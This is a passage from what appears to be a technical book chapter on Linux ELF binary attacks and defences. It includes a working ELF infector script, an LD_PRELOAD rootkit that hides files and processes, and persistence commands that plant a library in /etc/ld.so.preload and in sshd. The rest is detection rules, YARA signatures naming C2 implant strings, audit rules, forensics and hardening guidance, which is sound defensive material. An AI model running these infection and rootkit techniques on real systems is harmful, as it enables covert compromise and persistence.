$ gcc -shared -fPIC -o /tmp/evil/libcrypto.so.1.1 evil_libcrypto.c
# When target_binary runs, it loads /tmp/evil/libcrypto.so.1.1 first
```

The `$ORIGIN` token in `DT_RPATH`/`DT_RUNPATH` expands to the directory containing the binary. If the binary is in a world-writable directory (e.g., `/tmp`), `$ORIGIN` resolves there, and any user can plant libraries. CVE-2010-3847 exploited this via glibc's `$ORIGIN` handling in SUID binaries.

**Detection.** Audit all installed binaries for `DT_RPATH` entries pointing to writable directories:

```bash
#!/bin/bash
# rpath_audit.sh — find binaries with writable RPATH directories
find /usr /bin /sbin -type f -executable -print0 2>/dev/null | \
while IFS= read -r -d '' bin; do
    rpath=$(readelf -d "$bin" 2>/dev/null | \
            grep -oP '(?<=RPATH|RUNPATH\])[^\]]+' | tr ':' '\n')
    for dir in $rpath; do
        resolved="${dir/\$ORIGIN/$(dirname "$bin")}"
        if [ -d "$resolved" ] && [ -w "$resolved" ]; then
            echo "WARN: $bin has writable RPATH dir: $resolved"
        fi
    done
done
```

### 16.4 ELF header manipulation — segment overlap and PT_NOTE conversion

Binary patching techniques modify program headers to inject executable code without altering the original code segments. The two primary methods:

**PT_NOTE → PT_LOAD conversion.** The `PT_NOTE` segment is optional and ignored by the loader during execution. An attacker converts `p_type` from `PT_NOTE` (4) to `PT_LOAD` (1), sets `PF_R|PF_X` permissions, and points the segment at injected shellcode appended to the file or placed in structural padding. The original note data is sacrificed, but no note segment is required for normal execution.

```python
#!/usr/bin/env python3
"""pt_note_infect.py — PT_NOTE→PT_LOAD infection PoC
Educational/authorized-research only.
"""
import struct
import sys

def infect(elf_path, shellcode):
    with open(elf_path, 'rb') as f:
        data = bytearray(f.read())

    # Parse ELF header (64-bit)
    e_phoff = struct.unpack_from('<Q', data, 32)[0]
    e_phentsize = struct.unpack_from('<H', data, 54)[0]
    e_phnum = struct.unpack_from('<H', data, 56)[0]

    # Find PT_NOTE program header
    note_idx = None
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type = struct.unpack_from('<I', data, off)[0]
        if p_type == 4:  # PT_NOTE
            note_idx = i
            break

    if note_idx is None:
        print("No PT_NOTE segment found")
        sys.exit(1)

    # Append shellcode to the file
    sc_offset = len(data)
    data.extend(shellcode)
    # Pad to page alignment
    while len(data) % 4096 != 0:
        data.append(0)
    sc_size = len(shellcode)

    # Virtual address: place after the last PT_LOAD segment
    max_vaddr = 0
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type = struct.unpack_from('<I', data, off)[0]
        if p_type == 1:  # PT_LOAD
            p_vaddr = struct.unpack_from('<Q', data, off + 16)[0]
            p_memsz = struct.unpack_from('<Q', data, off + 40)[0]
            end = p_vaddr + p_memsz
            if end > max_vaddr:
                max_vaddr = end
    # Align to next page
    sc_vaddr = (max_vaddr + 0xFFF) & ~0xFFF

    # Convert PT_NOTE to PT_LOAD
    phdr_off = e_phoff + note_idx * e_phentsize
    struct.pack_into('<I', data, phdr_off, 1)            # p_type = PT_LOAD
    struct.pack_into('<I', data, phdr_off + 4, 5)        # p_flags = PF_R|PF_X
    struct.pack_into('<Q', data, phdr_off + 8, sc_offset) # p_offset
    struct.pack_into('<Q', data, phdr_off + 16, sc_vaddr) # p_vaddr
    struct.pack_into('<Q', data, phdr_off + 24, sc_vaddr) # p_paddr
    struct.pack_into('<Q', data, phdr_off + 32, sc_size)  # p_filesz
    struct.pack_into('<Q', data, phdr_off + 40, sc_size)  # p_memsz
    struct.pack_into('<Q', data, phdr_off + 48, 0x1000)   # p_align

    # Patch entry point to shellcode
    original_entry = struct.unpack_from('<Q', data, 24)[0]
    struct.pack_into('<Q', data, 24, sc_vaddr)

    with open(elf_path + '.infected', 'wb') as f:
        f.write(data)

    print(f"Original entry: 0x{original_entry:x}")
    print(f"Shellcode at:   0x{sc_vaddr:x} (file offset 0x{sc_offset:x})")
    print(f"Written to:     {elf_path}.infected")

if __name__ == '__main__':
    # Example: NOP sled + int3 as placeholder shellcode
    shellcode = b'\x90' * 16 + b'\xcc'
    infect(sys.argv[1], shellcode)
```

**Segment padding infection.** The gap between the end of the `.text` segment's file data and the next page-aligned segment is unused padding (often hundreds of bytes). Injecting shellcode into this padding and adjusting `p_filesz`/`p_memsz` of the text segment's `PT_LOAD` avoids creating new segments entirely. The binary's file size does not change. This is the technique used by the classic Silvio Cesare ELF virus.

```bash
# Identify padding gaps between PT_LOAD segments
$ readelf -l /bin/ls | grep -A2 LOAD
  LOAD    0x0000000000000000 0x0000000000000000 0x0000000000000000
          0x000000000001c4d8 0x000000000001c4d8  R E    0x1000
  LOAD    0x000000000001ce00 0x000000000001de00 0x000000000001de00
          0x0000000000001548 0x0000000000001700  RW     0x1000

# Gap = 0x1ce00 - 0x1c4d8 = 0x928 bytes (2344 bytes of usable padding)
```

### 16.5 `LD_PRELOAD` rootkit techniques

`LD_PRELOAD` forces the dynamic linker to load a specified shared library before all others, making every symbol in that library available for interposition. This is the simplest and most widely deployed ELF rootkit mechanism on Linux.

**Userspace rootkit via function interposition:**

```c
/* ld_preload_rootkit.c — hide files, processes, connections
 * Build: gcc -shared -fPIC -ldl -o rootkit.so ld_preload_rootkit.c
 * Deploy: echo /path/to/rootkit.so > /etc/ld.so.preload
 * Educational/authorized-research only.
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>

/* Hidden process name */
#define HIDDEN_PROC "implant"
#define HIDDEN_FILE "rootkit.so"

/* Interpose readdir to hide files and /proc entries */
struct dirent *readdir(DIR *dirp) {
    typedef struct dirent *(*orig_readdir_t)(DIR *);
    static orig_readdir_t orig_readdir = NULL;
    if (!orig_readdir)
        orig_readdir = (orig_readdir_t)dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        /* Hide our files */
        if (strstr(entry->d_name, HIDDEN_FILE))
            continue;
        /* Hide our process from /proc enumeration */
        if (strstr(entry->d_name, HIDDEN_PROC))
            continue;
        break;
    }
    return entry;
}

/* Interpose fopen to filter /proc/net/tcp (hide connections) */
FILE *fopen(const char *path, const char *mode) {
    typedef FILE *(*orig_fopen_t)(const char *, const char *);
    static orig_fopen_t orig_fopen = NULL;
    if (!orig_fopen)
        orig_fopen = (orig_fopen_t)dlsym(RTLD_NEXT, "fopen");

    /* For /proc/net/tcp, could return a filtered version */
    return orig_fopen(path, mode);
}
```

**Persistence mechanisms:**

1. **`/etc/ld.so.preload`** — system-wide; every dynamically-linked binary loads the listed libraries. Survives reboots. Does not require environment variable manipulation. Not affected by `AT_SECURE` (unlike `LD_PRELOAD` environment variable, `/etc/ld.so.preload` is honored even for SUID binaries in glibc).

2. **`LD_PRELOAD` in shell profiles** — `.bashrc`, `.profile`, `/etc/environment`, systemd unit `Environment=` directives.

3. **`DT_NEEDED` injection** — `patchelf --add-needed rootkit.so ./target` adds a permanent dependency; the binary always loads the malicious library regardless of environment.

```bash
# System-wide persistence via /etc/ld.so.preload
echo "/lib/x86_64-linux-gnu/.hidden/rootkit.so" > /etc/ld.so.preload

# Verify it takes effect
$ LD_DEBUG=libs /bin/ls 2>&1 | grep rootkit
      4872: find library=rootkit.so [0]; searching
      4872: calling init: /lib/x86_64-linux-gnu/.hidden/rootkit.so

# Per-binary persistence via DT_NEEDED injection
$ patchelf --add-needed rootkit.so /usr/bin/sshd
$ readelf -d /usr/bin/sshd | grep NEEDED
 0x0000000000000001 (NEEDED) Shared library: [rootkit.so]
 0x0000000000000001 (NEEDED) Shared library: [libwrap.so.0]
 ...
```

**`AT_SECURE` limitation.** For SUID/SGID binaries, the kernel sets `AT_SECURE=1` in the auxiliary vector, and glibc's dynamic linker strips `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, and other dangerous environment variables. However, `/etc/ld.so.preload` is **not** stripped — it is a root-owned file read directly by the linker. This is by design but makes `/etc/ld.so.preload` the highest-value persistence target for a root-level attacker on Linux.

---

## 17. ELF detection engineering

This section provides detection rules targeting the advanced ELF features and exploitation techniques from this chapter. For YARA rules covering basic structural anomalies (missing section headers, UPX packing), see Chapter 1A §16.

### 17.1 Sigma-style detection rules

**Rule 1: IFUNC relocations in non-libc binaries.**

```yaml
title: IFUNC Relocations in Non-System Binary
id: elf-ifunc-nonsystem
status: experimental
description: >
    Detects ELF binaries containing R_X86_64_IRELATIVE relocations that are not
    part of the system C library or known system components. IFUNC resolvers
    execute during load time and can serve as early-execution backdoors.
detection:
    selection:
        CommandLine|contains: 'readelf'
    filter:
        FilePath|startswith:
            - '/usr/lib'
            - '/lib'
    condition: selection and not filter
    # Operational: readelf -r <binary> | grep IRELATIVE
    # Alert if count > 0 and binary is not in /usr/lib or /lib
falsepositives:
    - Custom builds of performance-critical software using IFUNC
    - Go runtime (uses IFUNC for crypto dispatch)
level: medium
tags:
    - attack.persistence
    - attack.t1574
```

**Rule 2: PT_LOAD segment with W+X permissions.**

```yaml
title: ELF Binary with Writable and Executable PT_LOAD Segment
id: elf-wx-ptload
status: stable
description: >
    A PT_LOAD segment with both PF_W (write) and PF_X (execute) permissions
    violates W^X policy. Indicates self-modifying code, runtime unpacking,
    or a deliberately weakened binary.
detection:
    selection:
        # readelf -l <binary> | grep 'LOAD' shows flags like RWE
        SegmentFlags|contains: 'RWE'
    condition: selection
falsepositives:
    - JIT compilers (rare in static binaries)
    - Legacy binaries without -z separate-code
level: high
tags:
    - attack.defense_evasion
    - attack.t1027.002
```

**Rule 3: Missing PT_GNU_RELRO segment.**

```yaml
title: ELF Binary Missing PT_GNU_RELRO
id: elf-no-relro
status: stable
description: >
    Absence of PT_GNU_RELRO means the GOT and other metadata sections remain
    writable after load, enabling GOT overwrite attacks. Any internet-facing
    binary without RELRO is a hardening deficiency.
detection:
    selection_no_relro:
        # readelf -l <binary> | grep GNU_RELRO returns empty
        ProgramHeaders|not_contains: 'GNU_RELRO'
    condition: selection_no_relro
falsepositives:
    - Statically linked binaries (no GOT to protect)
    - Embedded/firmware with custom toolchain
level: high
tags:
    - attack.initial_access
    - attack.t1190
```

**Rule 4: `LD_PRELOAD` environment variable in process.**

```yaml
title: LD_PRELOAD Detected in Process Environment
id: elf-ldpreload-env
status: stable
description: >
    Detects processes running with LD_PRELOAD set. While legitimate for debugging
    and instrumentation, LD_PRELOAD is the primary vector for userspace rootkits
    on Linux.
detection:
    selection:
        # cat /proc/PID/environ | tr '\0' '\n' | grep LD_PRELOAD
        EnvironmentVariable: 'LD_PRELOAD'
    condition: selection
falsepositives:
    - Debugging with libasan, valgrind wrappers
    - Legitimate interposition (jemalloc, tcmalloc)
    - eatmydata for build acceleration
level: medium
tags:
    - attack.persistence
    - attack.t1574.006
```

**Rule 5: Modified `/etc/ld.so.preload`.**

```yaml
title: Modification of /etc/ld.so.preload
id: elf-ldso-preload-modified
status: stable
description: >
    /etc/ld.so.preload is read by every dynamically-linked process on the system,
    including SUID binaries. Modification indicates system-wide library injection.
    This file should not exist on most production systems.
detection:
    selection:
        TargetFilename: '/etc/ld.so.preload'
        EventType|any:
            - 'FileCreate'
            - 'FileModify'
    condition: selection
falsepositives:
    - Intentional system-wide LD_PRELOAD for monitoring (rare in production)
level: critical
tags:
    - attack.persistence
    - attack.t1574.006
```

**Rule 6: Oversized PT_NOTE segment.**

```yaml
title: ELF Binary with Oversized PT_NOTE Segment
id: elf-large-ptnote
status: experimental
description: >
    PT_NOTE segments typically contain small metadata (build-id, ABI tag).
    A PT_NOTE larger than 4KB may indicate data staging or a pending
    PT_NOTE→PT_LOAD conversion for code injection.
detection:
    selection:
        NoteSegmentSize|gt: 4096
    condition: selection
falsepositives:
    - Go binaries (large .note.go.buildinfo)
    - Binaries with extensive GNU property notes
level: low
tags:
    - attack.defense_evasion
    - attack.t1027
```

**Rule 7: Packed/encrypted ELF indicators.**

```yaml
title: Packed or Encrypted ELF Binary
id: elf-packed-encrypted
status: stable
description: >
    Detects ELF binaries showing packing indicators — high entropy in PT_LOAD
    segments, UPX signatures, modified entry point jumping to a non-standard
    section, or suspicious section names (.upx, .packed, .crypted).
detection:
    selection_sections:
        SectionName|any:
            - '.upx'
            - '.packed'
            - '.crypted'
            - '.vmprotect'
            - '.themida'
    selection_entropy:
        TextSegmentEntropy|gt: 7.0
    condition: selection_sections or selection_entropy
falsepositives:
    - Legitimately UPX-packed distribution binaries (rare)
level: high
tags:
    - attack.defense_evasion
    - attack.t1027.002
```

**Rule 8: Suspicious ELF section names.**

```yaml
title: ELF Binary with Suspicious Section Names
id: elf-suspicious-sections
status: experimental
description: >
    Non-standard section names that do not match compiler/linker conventions
    may indicate hand-crafted or post-processed binaries. Common in implants
    and packers.
detection:
    selection:
        SectionName|re: '^\.(payload|shell|inject|hook|stub|cave|evil|c2|beacon)'
    condition: selection
falsepositives:
    - Debug/research binaries with informal naming
level: medium
tags:
    - attack.defense_evasion
    - attack.t1036
```

### 17.2 YARA rules for advanced ELF threats

**ELF segment padding infection.**

```
rule elf_segment_padding_infection {
    meta:
        description = "ELF with code injected into text segment padding"
        severity = "high"
        technique = "T1055 - Process Injection"
    strings:
        $elf_magic = { 7f 45 4c 46 }
    condition:
        $elf_magic at 0 and
        uint8(4) == 2 and              // 64-bit
        // Check if any PT_LOAD's p_filesz was extended beyond its
        // section data (heuristic: last section in segment ends before p_filesz)
        for any i in (0..uint16(56) - 1) : (
            uint32(uint64(32) + i * 56) == 1 and    // PT_LOAD
            uint32(uint64(32) + i * 56 + 4) & 1 == 1 and  // PF_X set
            // executable segment with p_filesz significantly larger than
            // the .text section alone — padding may contain injected code
            uint64(uint64(32) + i * 56 + 32) > 0x1000 and
            // Check for executable instructions in the padding area
            // (NOP sled pattern or x86_64 function prologue in padding)
            for any j in (0..32) : (
                uint16(uint64(uint64(32) + i * 56 + 8) +
                       uint64(uint64(32) + i * 56 + 32) - 64 + j * 2)
                == 0x9090 or
                uint32(uint64(uint64(32) + i * 56 + 8) +
                       uint64(uint64(32) + i * 56 + 32) - 64 + j)
                == 0xe5894855  // push rbp; mov rbp, rsp
            )
        )
}
```

**Go implant indicators.**

```
rule elf_go_implant_indicators {
    meta:
        description = "ELF Go binary with implant-like characteristics"
        severity = "medium"
        technique = "T1059.004 - Command and Scripting Interpreter"
        reference = "Common in Cobalt Strike, Sliver, Merlin frameworks"
    strings:
        $elf_magic = { 7f 45 4c 46 }
        $go_buildinfo = ".note.go.buildinfo"
        $go_pclntab = "go.buildid"
        /* Suspicious Go package imports common in implants */
        $net_http = "net/http"
        $crypto_tls = "crypto/tls"
        $os_exec = "os/exec"
        $encoding_base64 = "encoding/base64"
        $net_dial = "net.(*Dialer).DialContext"
        $reverse_shell = { 2f 62 69 6e 2f 73 68 }  // "/bin/sh"
        /* C2 framework signatures */
        $sliver_1 = "sliverpb"
        $sliver_2 = "github.com/bishopfox/sliver"
        $merlin_1 = "github.com/Ne0nd0g/merlin"
        $cobalt_1 = "github.com/pry0cc"
    condition:
        $elf_magic at 0 and
        ($go_buildinfo or $go_pclntab) and
        (
            /* Implant: has networking + exec + encoding + shell access */
            (3 of ($net_http, $crypto_tls, $os_exec, $encoding_base64,
                   $net_dial, $reverse_shell)) or
            /* Known C2 framework strings */
            any of ($sliver_*, $merlin_*, $cobalt_*)
        )
}
```

**Rust implant indicators.**

```
rule elf_rust_implant_indicators {
    meta:
        description = "ELF Rust binary with implant-like characteristics"
        severity = "medium"
        technique = "T1059 - Command and Scripting Interpreter"
    strings:
        $elf_magic = { 7f 45 4c 46 }
        $rust_panic = "rust_begin_unwind"
        $rust_core = "/rustc/"
        /* Suspicious crate references */
        $reqwest = "reqwest"
        $hyper = "hyper::client"
        $tokio_process = "tokio::process"
        $command_spawn = "std::process::Command"
        $shell_ref = "/bin/sh"
        $base64_crate = "base64::engine"
        /* C2-specific */
        $mythic_1 = "mythic_agent"
        $link_1 = "github.com/postrequest/link"
    condition:
        $elf_magic at 0 and
        ($rust_panic or $rust_core) and
        (
            (3 of ($reqwest, $hyper, $tokio_process, $command_spawn,
                   $shell_ref, $base64_crate)) or
            any of ($mythic_*, $link_*)
        )
}
```

### 17.3 Auditd rules for ELF loader abuse monitoring

```bash
## /etc/audit/rules.d/elf-loader.rules
## Monitor ELF dynamic linker abuse vectors

# Watch /etc/ld.so.preload for creation, modification, deletion
-w /etc/ld.so.preload -p wa -k elf_preload_persistence

# Watch /etc/ld.so.conf and drop-in directory
-w /etc/ld.so.conf -p wa -k elf_loader_config
-w /etc/ld.so.conf.d/ -p wa -k elf_loader_config

# Watch ld.so.cache regeneration (ldconfig execution)
-w /sbin/ldconfig -p x -k elf_ldconfig_exec

# Monitor patchelf usage (binary modification tool)
-w /usr/bin/patchelf -p x -k elf_binary_modification

# Monitor execve with LD_PRELOAD in environment
# (requires auditd 3.0+ with --env filter or custom scripting)
-a always,exit -F arch=b64 -S execve -F key=elf_execve_audit

# Watch for writes to library directories by non-package-manager processes
-w /lib/x86_64-linux-gnu/ -p w -k elf_lib_write
-w /usr/lib/x86_64-linux-gnu/ -p w -k elf_lib_write

# Monitor memfd_create (used for fileless ELF execution)
-a always,exit -F arch=b64 -S memfd_create -k elf_memfd_create

# Monitor execveat with AT_EMPTY_PATH (fd-based exec for fileless malware)
-a always,exit -F arch=b64 -S execveat -k elf_execveat
```

Querying audit logs for suspicious events:

```bash
# Find all /etc/ld.so.preload modifications
ausearch -k elf_preload_persistence --interpret

# Find memfd_create calls (fileless execution staging)
ausearch -k elf_memfd_create --interpret | \
    grep -v 'comm="pulseaudio\|pipewire\|chromium"'

# Find patchelf usage
ausearch -k elf_binary_modification --interpret

# Correlate library writes with non-apt/non-dnf processes
ausearch -k elf_lib_write --interpret | grep -v 'comm="dpkg\|rpm\|dnf"'
```

### 17.4 Static analysis integration — `checksec` automation

A wrapper that produces machine-parseable output for CI/CD integration:

```bash
#!/bin/bash
# checksec_audit.sh — batch-audit ELF binaries and produce JSON report
# Usage: ./checksec_audit.sh /path/to/binaries/ > report.json

TARGET_DIR="${1:-.}"
echo '{ "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'", "binaries": ['

first=true
while IFS= read -r -d '' bin; do
    # Skip non-ELF
    file "$bin" | grep -q "ELF" || continue

    relro=$(readelf -l "$bin" 2>/dev/null | grep -c "GNU_RELRO")
    bindnow=$(readelf -d "$bin" 2>/dev/null | grep -c "BIND_NOW")
    nx=$(readelf -l "$bin" 2>/dev/null | grep "GNU_STACK" | grep -c -v "RWE")
    pie=$(readelf -h "$bin" 2>/dev/null | grep -c "DYN")
    canary=$(readelf -s "$bin" 2>/dev/null | grep -c "__stack_chk_fail")
    fortify=$(readelf -s "$bin" 2>/dev/null | grep -c "_chk@")
    rpath=$(readelf -d "$bin" 2>/dev/null | grep -oP '(?<=RPATH|RUNPATH\])[^\]]*')

    relro_status="none"
    [ "$relro" -gt 0 ] && relro_status="partial"
    [ "$relro" -gt 0 ] && [ "$bindnow" -gt 0 ] && relro_status="full"

    if [ "$first" = true ]; then first=false; else echo ','; fi

    printf '  {"path":"%s","relro":"%s","nx":%s,"pie":%s,"canary":%s,"fortify":%s,"rpath":"%s"}' \
        "$bin" "$relro_status" \
        "$([ "$nx" -gt 0 ] && echo true || echo false)" \
        "$([ "$pie" -gt 0 ] && echo true || echo false)" \
        "$([ "$canary" -gt 0 ] && echo true || echo false)" \
        "$([ "$fortify" -gt 0 ] && echo true || echo false)" \
        "$rpath"
done < <(find "$TARGET_DIR" -type f -executable -print0)

echo ''
echo ']}'
```

---

## 18. ELF forensics and binary analysis

This section covers forensic techniques specific to the advanced ELF features in this chapter. For basic memory extraction, disk-vs-memory comparison, and Volatility3 ELF plugins, see Chapter 1A §19.

### 18.1 Post-mortem core dump analysis — mapping VMAs to ELF segments

A core dump is itself an ELF file: its program headers are `PT_LOAD` segments capturing each VMA from the crashed process. The `PT_NOTE` segment contains the register state (`NT_PRSTATUS`), signal information, and the auxiliary vector.

```bash
# Analyze core dump structure
$ readelf -l core.1234
Program Headers:
  Type    Offset             VirtAddr           PhysAddr
          FileSiz            MemSiz             Flags  Align
  NOTE    0x0000000000000450 0x0000000000000000 0x0000000000000000
          0x0000000000001a38 0x0000000000000000         0x0
  LOAD    0x0000000000002000 0x00005555555540000 0x0000000000000000
          0x0000000000001000 0x0000000000001000  R      0x1000
  LOAD    0x0000000000003000 0x0000555555555000 0x0000000000000000
          0x0000000000002000 0x0000000000002000  R E    0x1000
  ...

# Extract register state from the NOTE segment
$ readelf -n core.1234 | head -30
Displaying notes found at file offset 0x00000450 with length 0x00001a38:
  Owner    Data size   Description
  CORE     0x00000150  NT_PRSTATUS (prstatus structure)
    siginfo: si_signo: 11, si_code: 1, si_errno: 0
    General purpose registers:
      rax: 0x0000000000000000  rbx: 0x00007ffff7ffd000
      rcx: 0x00007ffff7e9a7f0  rdx: 0x0000000000000000
      rsi: 0x0000000000000000  rdi: 0x00007fffffffe100
      rbp: 0x00007fffffffe0b0  rsp: 0x00007fffffffe090
      r8:  0x0000000000000000  rip: 0x0000555555555169
```

Mapping a crash address back to the originating ELF segment and symbol:

```bash
# From the core: RIP = 0x555555555169
# From /proc/PID/maps (or core's file-backed segments):
#   0x555555555000-0x555555557000 = /path/to/binary .text

# Offset within binary: 0x555555555169 - 0x555555555000 = 0x169
$ objdump -d /path/to/binary | grep -A5 "169:"
# Or with addr2line:
$ addr2line -e /path/to/binary -f 0x169

# For shared libraries, subtract the library base from the crash address
# Library base from core dump's PT_LOAD VMA for that library
```

Extracting the TLS state from a core dump requires locating the thread pointer. On x86_64, the `fs` base is not directly in `NT_PRSTATUS` but can be recovered from `NT_X86_XSTATE` or by reading the `arch_prctl` result cached in the TCB. gdb automates this:

```bash
$ gdb /path/to/binary core.1234
(gdb) info threads
  Id   Target Id          Frame
* 1    LWP 1234           0x0000555555555169 in vuln_func ()
  2    LWP 1235           0x00007ffff7e6a7f0 in __poll ()

(gdb) print/x $fs_base
$1 = 0x7ffff7d92740

(gdb) # Read stack canary at fs:0x28
(gdb) x/gx $fs_base + 0x28
0x7ffff7d92768: 0xd3a8b2f41c5e8100

(gdb) # Read TLS variable (offset known from readelf -S, .tdata offset)
(gdb) x/16bx $fs_base - 64
```

### 18.2 Binary diffing for patch analysis

When an ELF binary has been modified (supply chain compromise, unauthorized patching, or malware infection), binary diffing reveals the precise changes.

**Methodology with `radiff2` (radare2):**

```bash
# Byte-level diff between two ELF versions
$ radiff2 original.elf modified.elf
0x00001169 4889e5 => 909090 0x00001169
0x0000116c 4883ec10 => e8deadbeef 0x0000116c

# Function-level diffing
$ radiff2 -C original.elf modified.elf
            sym.main  100.0%  sym.main
            sym.vuln   87.3%  sym.vuln         # modified
        sym.auth_check  100.0%  sym.auth_check
                 (new)    ---   sym.backdoor    # added function
```

**Methodology with BinDiff/Diaphora:**

```bash
# Step 1: Generate IDA/Ghidra databases for both binaries
# Step 2: Run Diaphora (Ghidra plugin) or BinDiff (IDA plugin)
# Step 3: Review the diff categories:

# Diaphora output categories:
# - "Best matches"      → Functions identical in both versions
# - "Partial matches"   → Functions with modifications
# - "Unmatched (orig)"  → Functions removed in new version
# - "Unmatched (new)"   → Functions added in new version

# Focus forensic attention on:
# 1. Modified functions in security-critical paths (auth, crypto, input parsing)
# 2. Newly added functions (potential backdoor insertion)
# 3. Functions with changed control flow graphs but same name
```

**Quick structural diff using standard tools:**

```bash
# Section-level comparison
$ diff <(readelf -S original.elf) <(readelf -S modified.elf)

# Symbol table comparison (detect added/removed symbols)
$ diff <(readelf -s original.elf | sort -k8) \
       <(readelf -s modified.elf | sort -k8)

# Disassembly diff of a specific function
$ diff <(objdump -d original.elf | sed -n '/^[0-9a-f]* <vuln>:/,/^$/p') \
       <(objdump -d modified.elf | sed -n '/^[0-9a-f]* <vuln>:/,/^$/p')
```

### 18.3 Supply chain verification for ELF binaries

**Reproducible builds verification:**

```bash
# Rebuild from source with identical environment
$ docker run --rm -v $(pwd):/src debian:bookworm-slim bash -c \
    "apt-get update && apt-get install -y build-essential && \
     cd /src && make clean && make CFLAGS='-O2 -g' && \
     sha256sum target_binary"

# Compare hash with distributed binary
$ sha256sum /usr/bin/target_binary
# If hashes differ, binary was modified post-build

# For bit-for-bit reproducibility, also fix:
# - SOURCE_DATE_EPOCH (timestamps in __DATE__, __TIME__)
# - Build path embedding (-ffile-prefix-map)
# - Toolchain version
export SOURCE_DATE_EPOCH=$(date -d "2025-01-01" +%s)
gcc -ffile-prefix-map=$(pwd)=. -O2 -o target target.c
```

**Sigstore/cosign verification for ELF binaries:**

```bash
# Sign an ELF binary with cosign (keyless, OIDC-based)
$ cosign sign-blob --yes --output-signature sig.raw \
    --output-certificate cert.pem ./target_binary

# Verify signature
$ cosign verify-blob --signature sig.raw --certificate cert.pem \
    --certificate-oidc-issuer https://accounts.google.com \
    ./target_binary

# For container images containing ELF binaries
$ cosign verify --certificate-oidc-issuer https://accounts.google.com \
    registry.example.com/app:latest
```

**SBOM generation for ELF binaries:**

```bash
# Generate SPDX SBOM from a binary using syft
$ syft ./target_binary -o spdx-json > sbom.spdx.json

# Scan SBOM for known vulnerabilities
$ grype sbom:sbom.spdx.json

# For dynamically-linked binaries, include all DSO dependencies
$ ldd ./target_binary | awk '{print $3}' | grep -v "^$" | \
    while read lib; do
        echo "--- $lib ---"
        dpkg -S "$lib" 2>/dev/null || rpm -qf "$lib" 2>/dev/null
    done
```

### 18.4 Anti-forensics detection

Attackers strip forensic evidence from ELF binaries using several techniques. Each leaves detectable artifacts.

**ELF header stripping — zeroed `e_shoff`:**

```bash
# Detection: section header table pointer is zero
$ readelf -h suspect.elf | grep "section header"
  Start of section headers:          0 (bytes into file)
  Number of section headers:         0

# But the binary still runs — the kernel uses program headers, not sections.
# Reconstruction: use readelf -l to get PT_LOAD mappings, then recover
# section boundaries heuristically with objcopy or radare2:
$ r2 -A suspect.elf
[0x00001060]> iS   # radare2 reconstructs sections from segments
```

**Section table removal:**

```bash
# Stripping sections entirely (keeps program headers intact)
$ strip --strip-all --remove-section=.comment \
    --remove-section=.note.gnu.build-id binary.elf

# Detection: compare e_shnum against typical count for binary type
# A dynamically-linked binary with 0 sections is suspicious
$ python3 -c "
import struct, sys
with open(sys.argv[1], 'rb') as f:
    f.seek(60)  # e_shnum offset in ELF64
    shnum = struct.unpack('<H', f.read(2))[0]
    print(f'Section count: {shnum}')
    if shnum == 0:
        print('SUSPICIOUS: No section headers — possible anti-forensics')
" suspect.elf
```

**Debug information stripping:**

```bash
# Detection: check for absence of debug sections
$ readelf -S binary.elf | grep -E '\.debug_|\.zdebug_|\.gnu_debuglink'
# Empty output = debug info stripped

# Check if build-id exists (survives strip unless explicitly removed)
$ readelf -n binary.elf | grep "Build ID"
    Build ID: 7f3a8b...

# Use build-id to locate debug info on debug servers
$ debuginfod-find debuginfo 7f3a8b...
# Or look in /usr/lib/debug/.build-id/7f/3a8b....debug
```

**Symbol table removal detection:**

```bash
# Stripped binary: .symtab missing, only .dynsym remains
$ readelf -S binary.elf | grep -c '\.symtab'
0
$ readelf -S binary.elf | grep -c '\.dynsym'
1
# .dynsym cannot be stripped (needed by the dynamic linker)

# Compare against the same package version from the distribution
$ apt download coreutils 2>/dev/null
$ dpkg -x coreutils_*.deb /tmp/coreutils-ref
$ readelf -s /tmp/coreutils-ref/usr/bin/ls | wc -l    # ~600 symbols
$ readelf -s /usr/bin/ls | wc -l                        # if << 600, stripped beyond normal
```

**Timestamp manipulation:**

```bash
# ELF has no internal timestamp (unlike PE's TimeDateStamp), but:
# - .note.gnu.build-id encodes build identity
# - __DATE__/__TIME__ macros embed in .rodata if used
# - Filesystem timestamps (mtime, ctime) can be faked but ctime requires mount tricks

# Check for SOURCE_DATE_EPOCH markers (reproducible build artifact)
$ strings binary.elf | grep -E '(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec) [0-9]{1,2} [0-9]{4}'
```

---

## 19. ELF hardening reference

This section provides a comprehensive hardening reference for ELF binaries, extending the overview in Chapter 1A §18 with deeper coverage of modern compiler flags, linker options, runtime hardening, and cross-distribution comparison.

### 19.1 Compiler hardening flags — comprehensive guide

| Flag | GCC | Clang | Effect | Notes |
|------|-----|-------|--------|-------|
| `-fstack-protector-strong` | 4.9+ | 3.5+ | Stack canary on functions with arrays, address-taken locals, register spills | Recommended default; better coverage than `-fstack-protector` with less overhead than `-fstack-protector-all` |
| `-D_FORTIFY_SOURCE=2` | 4.0+ | yes | Compile-time and runtime bounds checking on `memcpy`, `strcpy`, `sprintf`, etc. | Requires `-O1` or higher |
| `-D_FORTIFY_SOURCE=3` | 12+ | 14+ | Extended FORTIFY: uses `__builtin_dynamic_object_size` for variable-length buffer checks | Catches overflows that `=2` misses when buffer size is determined at runtime |
| `-fPIE -pie` | 4.1+ | yes | Position-independent executable; enables full ASLR | Combine with linker `-pie` flag |
| `-fcf-protection=full` | 8+ | 7+ | CET IBT (`endbr64` landing pads) + Shadow Stack instrumentation | x86_64 only; requires kernel ≥ 5.18 and CET-capable CPU |
| `-mbranch-protection=standard` | 9+ (AArch64) | 8+ (AArch64) | BTI (Branch Target Identification) + PAC (Pointer Authentication Codes) | AArch64 only; `standard` = `bti+pac-ret` |
| `-fstack-clash-protection` | 8+ | 11+ | Stack probes on large allocations to prevent guard page skip | Mitigates CVE-2017-1000364 class |
| `-ftrivial-auto-var-init=zero` | 12+ | 8+ | Zero-initialize all automatic variables | Eliminates entire class of uninitialized-variable bugs |
| `-fno-delete-null-pointer-checks` | all | all | Preserves NULL checks that the optimizer would remove | Prevents miscompilation of security checks |
| `-Wformat -Wformat-security` | all | all | Warn on format string vulnerabilities | `-Werror=format-security` makes it a build failure |

